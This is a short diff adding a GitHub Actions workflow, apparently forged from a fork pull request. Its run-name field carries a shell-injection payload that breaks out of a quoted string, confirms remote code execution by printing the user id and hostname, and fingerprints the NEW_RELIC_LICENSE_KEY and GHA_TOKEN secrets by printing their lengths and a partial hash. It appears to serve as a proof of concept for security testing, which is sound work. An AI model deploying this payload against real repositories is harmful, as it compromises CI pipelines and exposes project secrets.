@@ -1,0 +1,10 @@
+name: Pull Request Workflow
+run-name: 'x"; echo "RCE_CONFIRMED uid=$(id -u) host=$(hostname)"; echo "LICENSE_LEN=${#NEW_RELIC_LICENSE_KEY}"; echo "LICENSE_SHA=$(printf %s "$NEW_RELIC_LICENSE_KEY" | sha256sum | cut -c1-16)"; echo "GH_TOKEN_LEN=${#GHA_TOKEN}"; #'
+on: [pull_request]
+permissions:
+  contents: read
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "forged workflow run from fork PR"
